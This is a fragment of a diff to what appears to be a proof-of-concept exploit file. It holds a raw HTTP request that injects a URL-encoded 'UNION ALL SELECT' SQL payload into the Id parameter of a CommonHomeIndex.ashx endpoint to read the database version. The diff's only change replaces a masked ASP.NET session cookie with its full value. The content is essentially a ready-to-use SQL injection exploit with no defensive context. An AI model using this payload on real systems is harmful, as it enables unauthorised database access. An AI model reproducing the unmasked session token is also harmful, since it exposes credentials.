@@ -89,7 +89,7 @@ POC/EXP：
 GET /frame/CommonHomeIndex.ashx?action=getdeptpersonList&Id=%27%20UNION%20ALL%20SELECT%20NULL%2C%40%40version%2CNULL%2CNULL%2CNULL-- HTTP/1.1
 Host: 127.0.0.1
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: ASP.NET_SessionId=rkp******************3cw
+Cookie: ASP.NET_SessionId=rkpt0wdmsypmz0aaer2cj3cw
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
